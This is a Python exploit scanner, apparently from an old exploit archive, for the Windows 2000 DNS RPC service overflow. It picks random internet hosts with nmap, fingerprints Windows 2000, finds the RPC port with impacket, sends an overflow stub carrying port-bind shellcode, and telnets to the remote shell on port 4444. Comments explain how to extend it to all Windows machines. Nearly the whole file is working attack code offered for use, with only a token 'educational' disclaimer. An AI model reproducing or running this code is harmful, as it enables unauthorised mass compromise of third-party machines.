#!/usr/bin/python
#This is a Windows DNS RPC service scanner for the new exploit #http://www.milw0rm.com/exploits/3737, uses nmap to locate win2000 machines
#and if found continues to use the exploit. Threw in a little threading to speed 
#the process up. Remove the 2000 and whitespace in between at line 137 to exploit
#all windows machines found. I noticed for this exploit you need impacket for it 
#to work properly, http://oss.coresecurity.com/repo/Impacket-0.9.6.0.tar.gz
#download that, untar, cd, su root, python setup.py install
#thats it...

#!!! You need to be root for the nmap flags to work properly  !!!

# Remote exploit for the 0day Windows DNS RPC service vulnerability as
# described in http://www.securityfocus.com/bid/23470/info. Tested on
# Windows 2000 SP4. The exploit if successful binds a shell to TCP port 4444
# and then connects to it.
#
# Cheers to metasploit for the first exploit.
# Written for educational and testing purposes.
# Author shall bear no responsibility for any damage caused by using this code
# Winny Thomas :-)

import os, StringIO, re, random, commands, sys, time, thread
try:
	from impacket.dcerpc import transport, dcerpc, epm
	from impacket import uuid
except(ImportError):
	print "\nYou need the Impacket Module"
	print "http://oss.coresecurity.com/repo/Impacket-0.9.6.0.tar.gz\n"
	sys.exit(1)

#Portbind shellcode from metasploit; Binds port to TCP port 4444
shellcode  = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += "\x29\xc9\x83\xe9\xb0\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\xe9"
shellcode += "\x4a\xb6\xa9\x83\xee\xfc\xe2\xf4\x15\x20\x5d\xe4\x01\xb3\x49\x56"
shellcode += "\x16\x2a\x3d\xc5\xcd\x6e\x3d\xec\xd5\xc1\xca\xac\x91\x4b\x59\x22"
shellcode += "\xa6\x52\x3d\xf6\xc9\x4b\x5d\xe0\x62\x7e\x3d\xa8\x07\x7b\x76\x30"
shellcode += "\x45\xce\x76\xdd\xee\x8b\x7c\xa4\xe8\x88\x5d\x5d\xd2\x1e\x92\x81"
shellcode += "\x9c\xaf\x3d\xf6\xcd\x4b\x5d\xcf\x62\x46\xfd\x22\xb6\x56\xb7\x42"
shellcode += "\xea\x66\x3d\x20\x85\x6e\xaa\xc8\x2a\x7b\x6d\xcd\x62\x09\x86\x22"
shellcode += "\xa9\x46\x3d\xd9\xf5\xe7\x3d\xe9\xe1\x14\xde\x27\xa7\x44\x5a\xf9"
shellcode += "\x16\x9c\xd0\xfa\x8f\x22\x85\x9b\x81\x3d\xc5\x9b\xb6\x1e\x49\x79"
shellcode += "\x81\x81\x5b\x55\xd2\x1a\x49\x7f\xb6\xc3\x53\xcf\x68\xa7\xbe\xab"
shellcode += "\xbc\x20\xb4\x56\x39\x22\x6f\xa0\x1c\xe7\xe1\x56\x3f\x19\xe5\xfa"
shellcode += "\xba\x19\xf5\xfa\xaa\x19\x49\x79\x8f\x22\xa7\xf5\x8f\x19\x3f\x48"
shellcode += "\x7c\x22\x12\xb3\x99\x8d\xe1\x56\x3f\x20\xa6\xf8\xbc\xb5\x66\xc1"
shellcode += "\x4d\xe7\x98\x40\xbe\xb5\x60\xfa\xbc\xb5\x66\xc1\x0c\x03\x30\xe0"
shellcode += "\xbe\xb5\x60\xf9\xbd\x1e\xe3\x56\x39\xd9\xde\x4e\x90\x8c\xcf\xfe"
shellcode += "\x16\x9c\xe3\x56\x39\x2c\xdc\xcd\x8f\x22\xd5\xc4\x60\xaf\xdc\xf9"
shellcode += "\xb0\x63\x7a\x20\x0e\x20\xf2\x20\x0b\x7b\x76\x5a\x43\xb4\xf4\x84"
shellcode += "\x17\x08\x9a\x3a\x64\x30\x8e\x02\x42\xe1\xde\xdb\x17\xf9\xa0\x56"
shellcode += "\x9c\x0e\x49\x7f\xb2\x1d\xe4\xf8\xb8\x1b\xdc\xa8\xb8\x1b\xe3\xf8"
shellcode += "\x16\x9a\xde\x04\x30\x4f\x78\xfa\x16\x9c\xdc\x56\x16\x7d\x49\x79"
shellcode += "\x62\x1d\x4a\x2a\x2d\x2e\x49\x7f\xbb\xb5\x66\xc1\x19\xc0\xb2\xf6"
shellcode += "\xba\xb5\x60\x56\x39\x4a\xb6\xa9"

# Stub sections taken from metasploit 
stub  = '\xd2\x5f\xab\xdb\x04\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00'
stub += '\x70\x00\x00\x00\x00\x00\x00\x00\x1f\x38\x8a\x9f\x12\x05\x00\x00'
stub += '\x00\x00\x00\x00\x12\x05\x00\x00'
stub += '\\A' * 465
# At the time of overflow ESP points into our buffer which has each char 
# prepended by a '\' and our shellcode code is about 24+ bytes away from 
# where EDX points
stub += '\\\x80\\\x62\\\xE1\\\x77'#Address of jmp esp from user32.dll
# The following B's which in assembly translates to 'inc EDX' increments
# about 31 times EDX so that it points into our shellcode 
stub += '\\B' * 43 
# Translates to 'jmp EDX'
stub += '\\\xff\\\xe2'
stub += '\\A' * 134 
stub += '\x00\x00\x00\x00\x76\xcf\x80\xfd\x03\x00\x00\x00\x00\x00\x00\x00'
stub += '\x03\x00\x00\x00\x47\x00\x00\x00'
stub += shellcode

def timer():
	now = time.localtime(time.time())
	return time.asctime(now)

# Code ripped from core security document on impacket
# www.coresecurity.com/files/attachments/impacketv0.9.6.0.pdf 
# Not a neat way to discover a dynamic port :-)
def DiscoverDNSport(target):
	trans = transport.SMBTransport(target, 139, 'epmapper')
	trans.connect()
	dce = dcerpc.DCERPC_v5(trans)
	dce.bind(uuid.uuidtup_to_bin(('E1AF8308-5D1F-11C9-91A4-08002B14A0FA','3.0')))
	pm = epm.DCERPCEpm(dce)
	handle = '\x00'*20
	while 1:
		dump = pm.portmap_dump(handle)
		if not dump.get_entries_num():
			break
		handle = dump.get_handle()
		entry = dump.get_entry().get_entry()
		if(uuid.bin_to_string(entry.get_uuid()) == '50ABC2A4-574D-40B3-9D66-EE4FD5FBA076'):
			port = entry.get_string_binding().split('[')[1][:-1]
			return int(port)

	print '[-] Could not locate DNS port; Target might not be running DNS'

def ExploitDNS(target, port):
	trans = transport.TCPTransport(target, port)
	trans.connect()
	dce = dcerpc.DCERPC_v5(trans)
	dce.bind(uuid.uuidtup_to_bin(('50abc2a4-574d-40b3-9d66-ee4fd5fba076','5.0')))	
	
	dce.call(0x01, stub)

def ConnectRemoteShell(target):
	connect = "/usr/bin/telnet " + target + " 4444"
	os.system(connect)
	

def Worker():
	
	global num
	global found
	
	nmap = StringIO.StringIO(commands.getstatusoutput('nmap -T 3 -O --host-timeout 35s --osscan-guess -iR 1')[1]).readlines() #Change your nmap flags if needed

	for tmp in nmap:
		if re.search("QUITTING!",tmp):
			print '[-] You must run this script as root for the nmap flags to work properly!!!'
			print 'Type: Ctrl-C\n'
			sys.exit(1)
		ip = re.findall("\d*\.\d*\.\d*\.\d*", tmp)
		if ip: 
			target = ip[0]
			print "Searching:",target
	for tmp in nmap:
		if re.search("Aggressive OS guesses:", tmp):
			os = tmp.split(",",1)[0].replace("Aggressive OS guesses:","")
			if os:
				os = re.sub(r'\(\d+%\)',"",os,1)
				print "\tFound:",os
				num +=1
				if re.search("Windows 2000",os):  #Take out the 2000 to exploit all windows found machines
					found.append(target+" : "+os)
					print "\tFound a Win2000 machine:",os
					print '\n[+] Locating DNS RPC port'
					port = DiscoverDNSport(target)
					print '[+] Located DNS RPC service on TCP port: %d' % port
					ExploitDNS(target, port)
					print '[+] Exploit sent. Connecting to shell in 3 seconds'
					time.sleep(3)
					ConnectRemoteShell(target)
			
if len(sys.argv) != 2:
	print "\n\t   d3hydr8[at]gmail[dot]com DNSRPCscanner v1.0"
	print "\t--------------------------------------------------"
	print "\n\tUsage: ./DNSRPCscanner.py <How many would you like to scan?>\n"
	print "\tEx. ./DNSRPCscanner.py 10000\n"
	sys.exit(1)

else:
	print "\n   d3hydr8[at]gmail[dot]com DNSRPCscanner v1.0"
	print "--------------------------------------------------"
	print "[+] Scanning: 0day Windows DNS RPC service vulnerability"
	print "[+] Targets:",int(sys.argv[1])
	print "[+] Starting:",timer(),"\n"
	print "[+] Scanning...\n"
	found = []
	num = 0
	for x in range(10):
		for i in range(int(sys.argv[1])/10):
			time.sleep(random.randint(1, 3))
			work = thread.start_new_thread(Worker, ())
print "\n[-] Scanning Complete:",timer()
print "[-] Found:",num,"o-systems"
print "[-] Found:",len(found),"using win2k\n"
if len(found) >=1:
	print "[-] Target List:\n"
	for os in found:
		print os



	
